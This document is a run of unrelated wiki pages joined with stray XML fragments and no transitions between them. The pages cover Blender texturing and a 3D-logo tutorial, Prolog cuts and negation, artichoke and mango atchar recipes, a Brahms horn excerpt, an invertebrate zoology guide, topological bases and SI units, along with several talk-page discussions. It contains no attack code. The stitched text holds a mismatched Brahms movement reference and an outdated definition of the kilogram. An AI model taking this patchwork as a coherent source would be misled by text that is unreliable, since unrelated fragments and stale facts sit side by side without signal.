Blender allows textures to influence materials in various ways, such as altering their colors. Multiple textures can interact with each other to produce interesting effects.

It is important though, to set your material first in Blender before the texture can be applied. This is compulsory in Blender. You must set your material property first before you can add a texture. But you can't do it the other way round. It's just that simple!

== Other Material Settings ==
Additional settings you can specify for a material include {{B3D:N2P/FirstUse|shaders}}, {{B3D:N2P/FirstUse|ray-tracing}} and {{B3D:N2P/FirstUse|halo}}.

Shaders determine how the appearance of a material varies with the angle of the light: {{B3D:N2P/FirstUse|diffuse}} shaders give a non-shiny look, while {{B3D:N2P/FirstUse|specular}} shaders give a mirror-like finish.  Blender's material settings always involve both kinds of shaders, but you can adjust a material's diffuse and specular colours separately to control their respective effects; if you set the specular colour to black, the surface will no longer produce reflections.

Ray-tracing is a technique for modeling the physical path of light through the scene. It is capable of producing exquisite reflection and refraction effects, including different degrees of reflectivity, translucency and transparency, and representing materials with different indexes of refraction. Blender provides two separate groups of ray-tracing settings, one for reflection of light and the other for its transmission through the material. You can control these settings on a per-material basis.

Halo rendering means an object no longer looks like solid matter, instead it appears to be made of bits of light. This can be used for real-world effects like fire, smoke and plasma, or to create fantasy effects with no connection to reality.

Note that reflections produced by ray-tracing are separate from that produced by the specular shader: the former are controlled by the material's mirror colour, while the latter is controlled by its specular colour.

Reflection is done in two different ways because, while ray-tracing produces the most realistic renders, it is also very CPU-intensive. It is therefore best to apply the ray-tracing effects when you're completely done with your modelling to help reduce high CPU usage. Enough practice with ray-tracing can also help you get stunning effects with just few clicks without you having to do much trial and error. You would do well to dedicate at least a few hours of your time to experimenting with it, so that in a future real production situation, you will be spared all that hassle.

==Types of Textures==
When you create a texture in Blender, you will see a popup menu listing a whole lot of different types for the texture. The {{B3D:N2P/FirstUse|Image or Movie}} texture type lets you use a scanned image to texture your object: for example, you can scan an actual piece of metal and use that to give your object a realistic metallic appearance, or use a photograph of an actual brick wall to texture the wall of a building model, and so on. You could even use a movie, which plays during the animation of the scene.

The other texture types are called {{B3D:N2P/FirstUse|procedural}}, which means the textures are generated according to algorithms built into Blender itself. These can be useful for simulating various effects when you don’t have an image of the real material handy; they can also be applied to augment the appearance in various ways.  For example:
* using a “cloud” texture to “dirty-up” a material
: or
* using one texture as a stencil to create an amalgam of two other textures.

      <text xml:space="preserve">== Modeling a 3D logo from a 2D logo in Blender 3D ==

I found an outdated logo creation tutorial at: [http://www.vrotvrot.com/xoom/tutorials/logoTut/logoTut.html www.vrotvrot.com]. Since I wanted to design a logo of my own, I've decided to take this tutorial as a basic and go on with my own logo creation from there. I do not intend to insult the original author, but I couldn't find a way to get in touch.


''' Tracing your logo '''

The most tedious part of creating a logo animation is tracing the logo. In most cases all you'll get as a freelancer is a paper print, or a bitmap of a company's logo. 

In this case, I just ripped a cool looking logo from the internet.

[Image:http://www.vrotvrot.com/xoom/tutorials/logoTut/original.jpg]

The first thing you'll need for this is a 2D logo that you want to make a 3D model of, I made up a fake company logo for this tutorial (try and get it in JPEG format).  You can click the link below to see it.

[http://www.geocities.com/schwiezer17/blender/rand_logo.jpg Random Logo Image]


'''note from spiderworm'''  thank you, i've responded back.
'''note from milovanderlinden'''  I am working on upgrading this tutorial.

''' Curve or polygon? '''

Ok I decided to step up to the plate and continue this simple tutorial.

You can use a curve, polyline and trace the outline of the 2D logo with those. Alternatively a polygon is used(say, a plane). The polygon is molded into 2D logo shape by subdivision and consequent pushing&amp;pulling the vertices so that the poly outline is the same as the logo.


''' Extruding the tracing curve '''

Once you have the logo traced with a curve or polyline, or polygon, select it, and press EKEY. Then extrude the profile as much as you like. Make sure it has faces on all sides.

''' Add Texture '''

Add a texture to the shape.

''' Lights, Camera, Render '''

Position lights and the camera so that the logo looks nice. Press F12 key to render.

      <text xml:space="preserve">[[Programming]] | [[Programming:Prolog|Prolog]] | Cuts and Negation

This section explains the use of cuts to control backtracking, the way negation is used in Prolog and  a useful combination of both.

== The cut ==

Consider the following program.

&lt;source lang=&quot;prolog&quot;&gt;
a :- b.
b :- c.
c :- d.
b.
&lt;/source&gt;

If you load this into Prolog and ask Prolog '''?- a.''', Prolog will evaluate it by first searching for any rule that can make '''a''' true; it adds '''a''' to its list of goals to prove. The first rule states that '''a''' is true if '''b''' is true, so Prolog adds the goal '''b''' to its list. It finds a rule for '''c''' and now needs to prove '''d''', which fails. Prolog now removes the goal '''d''' from its list, because it couldn't prove it, and tries to prove '''c''' in a different way. This is known as '''backtracking'''. Prolog can't prove '''c''' either, backtracks again and tries '''b'''. It can prove this, using the last line of the program and Prolog terminates.

Understanding how Prolog evaluates your query is essential in Prolog programming. To control the way Prolog evaluates your program, you can use the '''cut''' operator: '''!'''.  the cut operator is an atom, and can be used in the following way:

&lt;source lang=&quot;prolog&quot;&gt;a(X) :- b(X), c(X), !, d(X).&lt;/source&gt;

If Prolog finds a cut in a rule, it will not backtrack on the choices it has made. For instance, if it has chosen frank for the variable X and encounters a cut, Prolog will consider frank the only option for X, even if there are other possibilities in the database. 
This is illustrated by the following program

&lt;source lang=&quot;prolog&quot;&gt;a(X, Y) :- b(X), !, c(Y).
b(1).
b(2).
b(3).

c(1).
c(2).
c(3).
&lt;/source&gt;

If we ask Prolog '''?- a(Q, R).''' it will first answer

&lt;b&gt;&lt;br&gt;
?- a(Q, R).&lt;br&gt;
Q = 1&lt;br&gt;
R = 1 ;&lt;br&gt;
&lt;/b&gt;&lt;br&gt;
And when we ask Prolog for more answers, using the ''';'''-key:
&lt;b&gt;&lt;br&gt;
Q = 1&lt;br&gt;
R = 2 ;&lt;br&gt;
Q = 1&lt;br&gt;
R = 3 ;&lt;br&gt;
No&lt;br&gt;
&lt;/b&gt;. &lt;br&gt;

As you can see Prolog considers 1 as the only option for Q, whereas it returns all alternatives for R. When Prolog starts out on the query it tries to prove '''a(Q, R)''', using the first line of the program. To prove this rule, it needs to first '''prove b(Q)''', it succeeds with Q = 1. Then Prolog encounters a cut and sets Q = 1 as the only option for Q. It continues with the last goal of the rule, c(R). It first finds R = 1. and completes its goal. When user presses ''';''', Prolog first checks for alternatives to the goal c(R). Remember, when Prolog encountered the cut it hadn't chosen an instantiation for R yet, so it can still look for alternatives for R. When it runs out of alternatives for R, Prolog can't look for alternatives for Q, and terminates.

To understand how the cut changes the meaning of a program, consider the following:&lt;br&gt;
&lt;source lang=&quot;prolog&quot;&gt;
a(X) :- b(X), !, c(X).
b(1).
b(2).
b(3).

c(2).&lt;/source&gt;

Without the cut in the first line, Prolog would return '''Q = 2''' to the query '''?- a(Q).'''
With the cut Prolog fails to find an answer. To prove the goal, it first proves b(Q) with Q = 1. It then encounters a cut, is committed to Q=1 and can't find a proof for '''c(1)'''. If it could have searched for alternatives, it would have found that Q=2 makes both b(Q) and c(Q) true, but the cut doesn't allow that.
However, if we ask Prolog '''a(2)''', it will return yes. Now, Prolog instantiates the X in the first line of the program with 2, because the user has specified it, and when Prolog reaches the cut X becomes committed to 2, allowing Prolog to prove c(2).

The cut also works across multiple rules. If a program has two rules for the goal '''a(X)''', and Prolog encounters a cut in that rule, it is not only committed to the instantiations of the variables, but also to that rule for a(X). Prolog will not consider the second rule. For instance, the following program:

&lt;source lang=&quot;prolog&quot;&gt;
a(X) :- b(X), !, c(X).
a(X) :- d(X).

b(1).
b(4).

c(3).

d(4).
&lt;/source&gt;

will fail for the query '''?- a(X).'''. Prolog could solve the query with the second rule, using '''X =4''' and the last line of the program, but Prolog tries the first rule first and when it encounters the cut, it is forced to ignore all alternatives to a(Q). This time, the query '''?- a(4)''' will fail too, because Prolog still reaches the cut. When it tries '''a(4)''' with the first rule, it succeeds in proving '''b(4)''' and reaches the cut. It then tries '''c(4)''', which fails, and Prolog has to terminate. If the lines '''b(4).''' and '''b(1).''' are removed from the program, Prolog fails on the first rule, before it encounters the cut, and is allowed to solve the query with the second rule.

== Using Cuts ==

* examples where cuts are necessary
* if-then-else structures
* advice on using cuts ([http://en.wikipedia.org/wiki/Cut_%28logic_programming%29#Red_cut red cuts] &amp; [http://en.wikipedia.org/wiki/Cut_%28logic_programming%29#Green_cut green cuts])

== Negation ==
'''not(X)''' is the way to implement negation in Prolog; however '''not(X)''' does '''not''' mean that '''X''' is false, it means that '''X''' can't be proven true.

For example, with the database:

&lt;source lang=&quot;prolog&quot;&gt;
man('Adam').
woman('Eve').
&lt;/source&gt;

asking ''not(man('Abel')).'' will return yes.

== Cut-Fail negation ==

== Examples ==
&lt;source lang=&quot;prolog&quot;&gt;
not(Goal) :- call(Goal),!,fail.
not(Goal).
&lt;/source&gt;

== Exercises ==

{{recipe}}

Basic recipe on how to cook artichokes.
==Ingredients==
*1 [[Cookbook:Teaspoon|teaspoon]] [[Cookbook:Salt|salt]]
*1 [[Cookbook:Tablespoon|tablespoon]] [[Cookbook:Olive Oil|olive oil]]
*1 [[Cookbook:Artichoke|artichoke]]
*1 [[Cookbook:Lemon|lemon]]

==Procedure==
#Cut off artichoke stem and head.
#Remove base leaves and cut off pointy end of upper leaves.
#Rub artichoke in lemon to preserve color.
#Add salt (and any seasonings) to 3 inches of water, bring to low boil.
#Place artichoke top down in pot tall enough to place lid without touching the artichoke.
#Boil on low 30-45 minutes until bottom can be punctured without resistance.
#Place artichoke upside down to drain.
#Serve whole, with one or more dips. Diners should remove a leaf, dip the base of the leaf in the dip, and eat the fleshy base of the leaf.
#When all the leaves are gone, remove the choke, cut the heart of the artichoke into bite sized pieces, and serve with the dip.

==Seasonings==
#Parsley
#1-2 Garlic per artichoke
#Pepper
#1/8 cup white wine.
==Simple Dips==
*Drawn [[Cookbook:Butter|butter]]
*[[Cookbook:Mayonnaise|Mayonnaise]]
*[[Cookbook:Mustard Dip|Mustard Dip]]

This dip is in our opinion more tasty than butter or mayonnaise:

* 1/2 cup of Dijon mustard
* 1/4 cup of mayonnaise
* 1 tablespoon horseradish

      <text xml:space="preserve">What are you planning on teaching in this tutorial?  Could you briefly outline the things that will be taught here?  I just want to make sure it gets put in a logical spot in relation to the rest of the tutorials.  Thanx.  --[[User:Spiderworm|Spiderworm]] 23:52, 10 Mar 2005 (UTC)

== what the tutorial is for ==

Thanx for interest spiderworm, i didn't think anyone would ever look at this.  The purpose is to take a simple 2D bitmap graphic and turn it into a 3D model that you could rotate and use for presentations.  Let's face it - a 3D logo looks better than a 2D one and this is a pretty easy effect to master.  Basically, I'll show people how to load a background image into the workspace and trace it with a polygon and turn that polygon into an extrudable mesh.

Cheers, i'll get back to work now.
-Schwiezer

== gracias ==

Thanx for the update.  Try to make this a very basic tutorial then, where the user learns to extrude and CTRL+LMB to place new verts.  Your logo looks good :)  I'm placing this tute between Quickie Render and Modelling a Simple Person.  Also, can you come up with a more concise name for the title of this page? If so, let me know and I'll perform the move. --[[User:Spiderworm|Spiderworm]] 02:38, 11 Mar 2005 (UTC)</text>

In Brahms' First Symphony, second movement, the 1st horn has a duet with the violin during the first phrase of this excerpt. The second phrase is a horn solo.

Horn I in C

[[Image:Brahms1-4.png|Horn Solo in Fourth Movement.]]

The last movement solo is over muted strings. The second horn player plays whole notes at the same time the first has the dotted half notes in the 2nd, 4th, and 6th bars of the example. The effect is of one continuous line.

&lt;BIG&gt;&lt;BIG&gt;How to Use the ''Study Guide to Invertebrate Zoology''&lt;BIG&gt;&lt;/BIG&gt;

The purpose of the ''Study Guide to Invertebrate Zoology'' is to weave&amp;mdash;out of the information on Life Science contained in ''Wikipedia''&amp;mdash;a course of study for the student or layman.  It is anticipated that this course will be either supplemental to instruction being received at a school or college, or will be self-directed. In either case, the Guide is not a novel and should not be approached as one. A smooth flow of dialogue is simply not possible and should not be anticipated.  The Guide may be closer to the sometimes disjointed notes generated by a student from a lecture or careful reading of a detailed textbook.

Within each subsection of a Chapter, introductory text is followed by one or more &quot;reading assignments&quot; of the form:

*Read [[Wikipedia:en:Zoology|Zoology]] (&lt;small&gt;Links need not be pursued at this time&lt;/small&gt;) 

Following (that is ''clicking'' on) the link (to ''Wikipedia'' &quot;Zoology&quot; article in this case) will open an article intended to provide the details of the Chapter subsection. Recommended articles should be read from top to bottom, and then re-read following some or all of the links embedded in the article to other articles for expanded elucidation or to clarify terms; that is, in most cases, completion of an &quot;assignment&quot; (recommended article) includes at least some or all articles linked to the first.  Obviously, it cannot be the case that all links are followed to articles, whose links are then followed to articles, and so on until no new material is encountered. It is likely there would be no quick end to such a pursuit. The amount of time spent wandering beyond the original article is partly a personal matter of how much the reader is getting out of the foray than anything else. Realize it is certainly possible to wander well off the subject at hand.  As in the example above, notes are provided with assignments giving some direction for pursuing links. An instruction NOT to pursue links simply means the additional material will be encountered later in the course of instruction, and going beyond the assigned article may provide too much detail for a beginning student.  The following example: 

* Read [[Wikipedia:en:Science|Science]] (&lt;small&gt;The following links are included:&lt;/small&gt;)
** [[Wikipedia:en:Scientific method|Scientific Method]]
** [[Wikipedia:en:Philosophy of science|Philosophy of Science]]

specifies that two other links ARE part of the assignment.  Other links encountered may be followed to expand your knowledge or, as always, to aid in  understanding of technical terms encountered. Hyperlinks included with the text in the Guide are there simply for convenience, usually to topics somewhat peripheral to the main one.  In all cases, finding your way back to the Guide may become tricky, but we have to leave this up to you to establish, beyond pointing out that your browser's ''Back'' button is intended for this purpose.   

Note that at the beginning of each module, links are provided to both the previous chapter and the succeeding chapter, as well as to the main Table of Contents.

Although initially developed as a &quot;Guide&quot;, by which is meant a sort of outline with links to Wikipedia articles, it is not necessary to scrupulously maintain the format.  If, as a contributor, you would prefer to flesh out any module with minimal reference to Wikipedia, that should be acceptable, so long as your contribution exceeds what is available on the topic at Wikipedia.  In this instance, &quot;exceeding&quot; is a reference to quality and not quantity.  In such cases, it might remain helpful to the student to place the reading &quot;assignment&quot; as a &quot;See also:&quot; link on the chapter page.  

Use of any Wikipedia article as a substitute for text should include consideration of the quality of information and writing at the assigned article. It is simply one approach to work on that article to insure quality before assigning it.  Another approach would be to ignore the article at Wikipedia and develop the necessary text in the module itself.  This does have a disadvantage in that, through hyperlinks, the student may well later arrive at the &quot;rejected&quot; Wikipedia article anyway. If the information found there conflicts or confuses, the student may have difficulty establishing which bits of information are correct and which are not.

== Zoology as a Science ==

Zoology is the branch of '''biology''' concerned with the scientific study of animals. Invertebrate Zoology deals with only a specific, although very large, part of the '''Animal Kingdom''' as we shall learn further into this Chapter. Zoology is not usually a starting course in biology, so it must be assumed that the student or user of this Guide already has some background in biology.  This should be sufficient; it is not necessarily the case that Biology is followed by ofGeneral Zoology is followed by Invertebrate Zoology. However, you may find much of the material difficult to comprehend if you have not first acquired basic knowledge in General Biology. Nonetheless, our first assigned read at ''Wikipedia'' will be a review of biology and zoology as sciences: 

* Read [[Wikipedia:en:Biology|Biology]] (&lt;small&gt;Links need not be pursued at this time&lt;/small&gt;)
* Read [[Wikipedia:en:Zoology|Zoology]] (&lt;small&gt;Links need not be pursued at this time&lt;/small&gt;) 
:and note that other texts encompassing topics in biology are available (''under development'') at the Wikibooks [[Wikibooks:biology bookshelf|biology bookshelf]] as sources of reference.

&lt;/noinclude&gt;


==Definition==
Let &lt;math&gt;(X,\mathcal{T})&lt;/math&gt; be a topological space. A collection &lt;math&gt;\mathcal{B}&lt;/math&gt; of open sets is called a '''base''' for the topology &lt;math&gt;\mathcal{T}&lt;/math&gt; if every open set &lt;math&gt;U&lt;/math&gt; is the union of sets in &lt;math&gt;\mathcal{B}&lt;/math&gt;.

Obviously &lt;math&gt;\mathcal{T}&lt;/math&gt; is a base for itself.

==Conditions for Being a Base==
In a topological space &lt;math&gt;(X,\mathcal{T})&lt;/math&gt; a collection &lt;math&gt;\mathcal{B}&lt;/math&gt; is a base for &lt;math&gt;\mathcal{T}&lt;/math&gt; if and only if it consists of open sets and for each point &lt;math&gt;x\in X&lt;/math&gt; and open neighborhood &lt;math&gt;U&lt;/math&gt; of &lt;math&gt;x&lt;/math&gt; there is a set &lt;math&gt;B\in\mathcal{B}&lt;/math&gt; such that &lt;math&gt;x\in B\subseteq U&lt;/math&gt;.

==Constructing Topologies from Bases==
Let &lt;math&gt;X&lt;/math&gt; be any set and &lt;math&gt;\mathcal{B}&lt;/math&gt; a collection of subsets of &lt;math&gt;X&lt;/math&gt;. There exists a topology &lt;math&gt;\mathcal{T}&lt;/math&gt; on &lt;math&gt;X&lt;/math&gt; such that &lt;math&gt;\mathcal{B}&lt;/math&gt; is a base for &lt;math&gt;\mathcal{T}&lt;/math&gt; if and only if &lt;math&gt;\mathcal{B}&lt;/math&gt; satisfies the following:
# If &lt;math&gt;x\in X&lt;/math&gt;, then there exists a &lt;math&gt;B\in\mathcal{B}&lt;/math&gt; such that &lt;math&gt;x\in B&lt;/math&gt;.
# If &lt;math&gt;B_1,B_2\in\mathcal{B}&lt;/math&gt; and &lt;math&gt;x\in B_1\cap B_2&lt;/math&gt;, then there is a &lt;math&gt;B\in\mathcal{B}&lt;/math&gt; such that  &lt;math&gt;x\in B\subseteq B_1\cap B_2&lt;/math&gt;.

'''Remark :''' Note that the first condition is equivalent to saying that ''The union of all sets in &lt;math&gt;\mathcal{B}&lt;/math&gt; is &lt;math&gt;X&lt;/math&gt;.''

==Semibases==
Let &lt;math&gt;X&lt;/math&gt; be any set and &lt;math&gt;\mathcal{S}&lt;/math&gt; a collection of subsets of &lt;math&gt;X&lt;/math&gt;. Then &lt;math&gt;\mathcal{S}&lt;/math&gt; is a semibase if a base of X can be formed by a finite intersection of elements of &lt;math&gt;\mathcal{S}&lt;/math&gt;.

==Exercises==

# Show that the collection &lt;math&gt;\mathcal{B}=\{(a,b):a,b\in\mathbb{R},a&lt;b\}&lt;/math&gt; of all open intervals in &lt;math&gt;\mathbb{R}&lt;/math&gt; is a base for a topology on &lt;math&gt;\mathbb{R}&lt;/math&gt;. 
# Show that the collection &lt;math&gt;\mathcal{C}=\{[a,b]:a,b\in\mathbb{R},a&lt;b\}&lt;/math&gt; of all closed intervals in &lt;math&gt;\mathbb{R}&lt;/math&gt; is '''not''' a base for a topology on &lt;math&gt;\mathbb{R}&lt;/math&gt;.
# Show that the collection &lt;math&gt;\mathcal{L}=\{(a,b]:a,b\in\mathbb{R},a&lt;b\}&lt;/math&gt; of half open intervals is a base for a topology on &lt;math&gt;\mathbb{R}&lt;/math&gt;.
# Show that the collection &lt;math&gt;\mathcal{S}=\{[a,b):a,b\in\mathbb{R},a&lt;b\}&lt;/math&gt; of half open intervals is a base for a topology on &lt;math&gt;\mathbb{R}&lt;/math&gt;.
# Let &lt;math&gt;a,b\in\mathbb{R}&lt;/math&gt;. A '''Partition''' &lt;math&gt;\mathcal{P}&lt;/math&gt; over the closed interval &lt;math&gt;[a,b]\,\!&lt;/math&gt; is defined as the ordered n-tuple &lt;math&gt;a&lt;x_1&lt;x_2&lt;\ldots &lt;x_n&lt;b \,\!&lt;/math&gt;; the '''norm''' of a partition &lt;math&gt;\mathcal{P}&lt;/math&gt; is defined as &lt;math&gt;\|\mathcal{P}\|=\sup \{x_i-x_{i-1}|2\leq i\leq n\}&lt;/math&gt; &lt;br/&gt; For every &lt;math&gt;\delta &gt;0\,\!&lt;/math&gt;, define the set &lt;math&gt;U_{\delta}=\{\mathcal{P}|\|\mathcal{P}\|\leq\delta\}&lt;/math&gt;.  &lt;br/&gt; If &lt;math&gt;X\,\!&lt;/math&gt; is the set of all partitions on &lt;math&gt;[a,b]\,\!&lt;/math&gt;, prove that the collection of all &lt;math&gt;U_{\delta}\,\!&lt;/math&gt; is a Base over the Topology on &lt;math&gt;X\,\!&lt;/math&gt;.

      <comment>/* Fundamental SI Units */</comment>
      <text xml:space="preserve">== Fundamental SI Units ==

SI unit system defines the following seven fundamental units in terms of how they can be measured. All other units in SI unit system can be derived from these. Also note that from physical point of view, only the first three, length, mass, and time are fundamental. Mole and Kelvin are actually arbitrary choice of scaling factor that has proven useful in various fields, and candela is also defined in terms of existing quantities.  Note that derived unit'' means that it can be determined from the fundamental units, and ''not'' that it can be expressed in terms of them.

*Meter (m), the unit of length.  It is defined as being the length of the path traveled by light in vacuum in 1/299 792 458 of a second. 

*Kilogram (kg), the unit of mass. Note that the gram is ''not'' the fundamental unit for mass.  It is defined by an actual platinum-iridium bar, though there is discussion of defining it by a more universal constant.  It's worth noting in advance that a kilogram is not a unit of weight, which is a type of force.

*Second (s), the unit of time. The second is the duration of 9,192,631,770 periods of the radiation corresponding to the transition between the two hyperfine levels of the ground state of the cesium-133 atom. [http://physics.nist.gov/cuu/Units/second.html NIST(1)].

*Ampere (A), the unit of electric current. The ampere is defined as ''that constant current which, if maintained in two straight parallel conductors of infinite length, of negligible circular cross section, and placed 1 meter apart in vacuum, would produce between these conductors a force equal to 2 x 10-7 newton per meter of length''. [http://physics.nist.gov/cuu/Units/ampere.html NIST(2)]

*Mole (mol), the unit of quantity. One mole contains as many items as 12 grams of Carbon-12 contains of atoms. That number is known as Avogadro's Number, which is approximately &lt;math&gt;6.02214199\times 10^{23}&lt;/math&gt;.

*[[Kelvin]] (K), the unit of temperature. It is defined as the fraction 1/273.16 of the thermodynamic temperature of the triple point of water[http://physics.nist.gov/cuu/Units/kelvin.html NIST(3)].  The 'easy' way to find the temperature in Kelvin is to add 273.15 to the temperature in Celsius.

*Candela (cd), the unit of luminous intensity or brightness. It is defined as ''the luminous intensity, in a given direction, of a source that emits monochromatic radiation of frequency &lt;math&gt;540\times 10^{12}&lt;/math&gt; hertz and that has a radiant intensity in that direction of 1/683 watt per steradian.'' [http://physics.nist.gov/cuu/Units/candela.html NIST(4)].

==Derived SI Units==
In physics there are many quantities that cannot be expressed by a single base unit.  For example, speed, the rate at which a position changes with time, is expressed as a combination of the unit for distance (meters) and the unit for time (seconds).  As we will soon learn, the speed is equal to the distance divided by the time.  Therefore, the unit of speed is the ''meter per second'', or ''m/s''.  The unit ''meter per second'' is called a ''derived unit'', meaning that it is derived from the seven SI base units.

Units can be combined together in many possible combinations, and any physically-significant quantity will have its own units.  Some frequently-used combinations get their own names.  Here are a sample of some of the more common ones:

*Newton (N), the unit of force.
**&lt;math&gt;\mathrm{N} = \mathrm{kg} \cdot \mathrm{m}/\mathrm{s}^2 &lt;/math&gt;

*Joule (J), the unit of energy.
**&lt;math&gt;\mathrm{J} = \mathrm{N} \cdot \mathrm{m} = \mathrm{kg} \cdot \mathrm{m}^2/\mathrm{s}^2 &lt;/math&gt;

*Watt (W), the unit of power.
**&lt;math&gt;\mathrm{W} = \mathrm{J}/\mathrm{s} \ &lt;/math&gt;

*Pascal (Pa), the unit of pressure.
**&lt;math&gt;\mathrm{Pa} = \mathrm{N}/\mathrm{m}^2 \ &lt;/math&gt;

*Hertz (Hz), the unit of frequency.
**&lt;math&gt;\mathrm{Hz} = 1/\mathrm{s} = \mathrm{s}^{-1} \ &lt;/math&gt;

*Coulomb (C), the unit of electric charge.
**&lt;math&gt;\mathrm{C} = \mathrm{A} \cdot \mathrm{s} &lt;/math&gt;

*Volt (V), the unit of electric potential or voltage.
**&lt;math&gt;\mathrm{V} = \mathrm{J}/\mathrm{C} = \mathrm{W}/\mathrm{A} \ &lt;/math&gt;

*Ohm (&lt;math&gt; \Omega &lt;/math&gt;), the unit of electric resistance.
**&lt;math&gt;\Omega = \mathrm{V}/\mathrm{A} \ &lt;/math&gt;

*Farad (F), the unit of electric capacitance.
**&lt;math&gt;\mathrm{F} = \mathrm{C}/\mathrm{V} \ &lt;/math&gt;

*Tesla (T), the unit of magnetic field strength.
**&lt;math&gt;\mathrm{T} = \mathrm{N}/\mathrm{A} \cdot \mathrm{m} &lt;/math&gt;

*Weber (Wb), the unit of magnetic flux.
**&lt;math&gt;\mathrm{Wb} = \mathrm{T} \cdot \mathrm{m}^2 &lt;/math&gt;

==SI Prefixes==
Physics spans the very small to the very large.  Particle physicists are interested in distances as small as the radius of a proton, 10&lt;sup&gt;-15&lt;/sup&gt; m or smaller.  Meanwhile, astronomers may be interested in measuring distances of  a parsec, around 10&lt;sup&gt;16&lt;/sup&gt; m, or greater.

The &quot;English&quot; system used different units to indicate the scale of measurement.  For example, one might say that one's house has a length of 53 feet.  However, perhaps New York City is 150 miles away.  While it would be perfectly accurate to do so, no person would state that their house was 0.010 miles long or that New York City was 792 000 feet away.  In both cases, the unit doesn't accurately represent the scale of the measurement.

In SI, prefixes are available to adjust the size of a unit so as to keep the number of those units reasonable.  Prefixes may be added to either base units or derived units.

Here are the accepted SI prefixes:

For example, it would be awkward to speak about the capacitance of a particular device as &quot;0.000 000 000 010 farads.&quot;  Using the unit &quot;10 picofarads&quot; is a lot more sensible.

For some reason, however, not all prefixes are frequently used.  Distances are rarely given in units larger than kilometers and masses usually aren't given in units larger than kilograms.  Experience will indicate when certain implied conventions apply, but it's never incorrect to refer to a distance of 5 400 000 000 m as 5.4 Gm.  The point will be made and the value will be understood.

==Calculations with Units==
When performing calculations in physics, it is very helpful to keep track of the units of each numerical quantity.  The unit of the result can often lend insight into the nature of what has been calculated.

When adding or subtracting values with units, each quantity must have the same unit.  The result has the same unit as the operands.  For example:

:5 m + 3 m = 8 m
:2.50 kg + 3.712 kg = 6.21 kg
:57 feet + 192 inches = ?????

If quantities have different units, one must first convert to a common unit before the calculation is completed:

:57 feet + 192 inches = 57 feet + 16 feet = 73 feet.

When multiplying or dividing values with units, the units are multiplied or divided too.

:&lt;math&gt;(20\ \mathrm{m}) \times (5\ \mathrm{m}) = 100\ \mathrm{m}^2&lt;/math&gt;

:&lt;math&gt;(1000\ \mathrm{N}) / (40\ \mathrm{m}) = 25\ \mathrm{N}/\mathrm{m}&lt;/math&gt;

Sometimes the resulting unit has a special name:

:&lt;math&gt;(400\ \mathrm{J}) / (5\ \mathrm{s}) = 80\ \mathrm{J}/\mathrm{s} = 80\ \mathrm{W}&lt;/math&gt;

      <text xml:space="preserve">Why do the equations change sizes? Can someone put the derived unit equations down below the definitions?
----
I thought there were only ''three'' fundamental units: length, mass, and time; and the others could be defined from them. (And that is what my lower division physics textbook says too.) Does anyone have a reference that says something like &quot;ampere&quot; is a fundamental unit? [[User:Novakyu|novakyu]] 03:13, 15 Mar 2005 (UTC)
: Egh. Fixed it myself by clarifying what is meant by &quot;fundamental&quot;. The 7 units are &quot;fundamental&quot; in the sense that they are the beginning units for SI system. But physically speaking, only the first three are---you can see in the definitions that the four other units are actually defined in terms of the first three or their derived units.

Atchar is a spicy condiment, often eaten with a curry. It comes from the Indian cuisine in South Africa. In India, it is spelled Achar, and the word means pickle in Hindi. Usually the atchar made in South Africa is made with unripe green mangoes and chillies. The whole mango is used for making atchar.

This traditional mango atchar is easily made at home. Adjust the amount of chillies to your liking and serve with a vegetable curry, or on a slice of white bread.

== Ingredients ==

* 1.5 kg unripe mangoes, chopped
* 4 tsp garlic and herb salt
* 3 Tbs chilli powder
* 2 Tbs cumin powder
* 1 Tbs ground coriander
* 3 Tbs curry powder
* 1.5 cups (360ml) raw honey or fructose
* 2 cups (480ml) balsamic vinegar
* 0.5 cup (120g) corn or potato flour
* 2 Tbs mustard seeds
* handful curry leaves
* 1.5 cups (360ml) virgin olive oil or cold pressed sunflower oil

==Procedure==
Simmer all the ingredients except the mangoes and the oil, until it thickens. Pour over the mangoes, add the oil, mix well, cool and refrigerate for at least 12 hours.

      <text xml:space="preserve">==method 1 - bringing the outer circle into 3d==
'''[Noob Note:''' I'm new to Blender but have been dealing with bezier's for a long time, and this method of creating the slashed circle seems excessively complicated (whereas the other alternative presented bypasses the point of using curves altogether). The inside of the circle is just 2 half circles cut out from the original larger circle and would only need 2 points to draw out (for each half). Here's what I did.

Another noob note: I found that instead of doing all of this, just insert the inner circle, rotate by 45 degrees, and scale and grab along y and x axis and you will have a much better looking circle

note added 12/08..... all these methods produce something that is &quot;LIKE&quot; the logo jpg but all end up different.  Look at the picture..THE TOP PART OF THE LIGHTNING BOLD IS ON TOP OF THE RED CIRCLE... only the body and bottom tip of the lightning bolt are underneath it.  The lightning bolt must be rotated on the x axis to correctly finish the logo.

== method 3 - bringing the outer circle into 3d==
(Another way to do it is to create a ring with 2 Tubes ('''SPACE''' -&gt; Add -&gt; Mesh -&gt; tube). Scale one to the size of the outer border of the ring and one to the size of the inner one. Then in edit mode select 2 Vertices next to each other on the inner and outer tube and made a face ('''FKEY''') which covered one segment of the ring. Then you have to spin it like described above (the number depends on the number of vertices you choose for your tube tube = 32 Verticles -&gt; 632 rotationsteps). Same on the other side. If your faces are not in the right place go to object mode select the tubes an press '''SHIFT'''+'''SKEY''' and choose 'Cursor -&gt; Selection' to center the 3D cursor.)

==an other way (faster)==
n00b note. This is an other way (faster) add a open circle, make it right size, extrude + esc, scale, mark them both and press F for fill, and rotate it so 4 vertexes are the corners of the line over the lightning, make edges with 2 vertex and F, I think u know the rest so ur done now :D

:this is now method 2 [[User:Pearts|Pearts]] ([[User talk:Pearts|talk]]) 01:22, 4 September 2010 (UTC)

== Rewrite ==

This tutorial seems disjointed, and several of the images have been lost.

Would anyone mine if I wrote another one from scratch on the same subject?

--[[User:Lazy-lump]] 20 Jan, 2008

:I've cleaned it up! [[User:Pearts|Pearts]] ([[User talk:Pearts|talk]]) 01:22, 4 September 2010 (UTC)

-----

I am following this tutorial on another similar logo.  Now that I have completed it, when I select one of the letters, ALL of the letters select (in object mode).  I can't split them up and for example rotate one of the letters at a time.  Sure I can select them individually in edit mode, but then I cannot translate in the z direction and do other things I want to do.

But in this tutorial the lightning bolt and the circle X are acting as two distinct objects.  Is this something I missed in an earlier tutorial.  Perhaps someone could add more detail about this?

-----

OOPS!

Didnt realize you're going into beziers here.  I'll find a more appropriate spot for this tute.  Beziers, of course!  I suppose I'll separate mesh modeling from bezier modeling from metaballs from etc....  I'll figure out a good spot for this, continue your good work on this please!  --[[User:Spiderworm|Spiderworm]] 13:34, 11 Mar 2005 (UTC)

Ok, looks like this tutorial needs some one to finish it. I'll give it a try.
